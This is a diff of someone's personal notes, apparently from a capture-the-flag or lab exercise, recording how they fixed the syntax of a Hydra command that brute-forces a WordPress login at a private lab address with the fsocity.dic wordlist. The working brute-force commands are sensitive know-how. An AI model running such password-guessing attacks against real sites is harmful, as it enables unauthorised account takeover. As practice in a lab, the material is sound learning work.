@@ -67,7 +67,7 @@ time: 12:47
 					- Never mind I got Hydra working
 				- ### Attempt 3: Fail and Success
 					- Ok so I got hydra working. It wasn't that it needed an internet connection for it to work it was just that I had a wrong syntax.
-					- I had this `hydra -L /Downloads/fsocity.dic -P /Downloads/fsocity.dic 10.38.1.101 http-post-form "/wp-login.php/log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.38.1.101%2Fwp-admin%2F&testcookie=1:Login in failed"
+					- I had this `hydra -L /Downloads/fsocity.dic -P /Downloads/fsocity.dic 10.38.1.101 http-post-form "/wp-login.php/log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.38.1.101%2Fwp-admin%2F&testcookie=1:Login in failed`
 					- And when I ran this I got an error saying that hydra couldn't connect. This was the reason why I thought that I needed an internet connection for hydra to run but that wasn't the case
 					- The correct command was `hydra -L fsocity.dic -P fsocity.dic 10.38.1.101 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.38.1.101%2Fwp-admin%2F&testcookie=1:Login in failed"` 
 					- The problem was that I need to put `:` these at certain places. Also at the end it needs to say `Login in failed` and I had thought this was part of the URL that was input in the research that I had seen but today it clicked somehow that web logins wouldn't really way that.
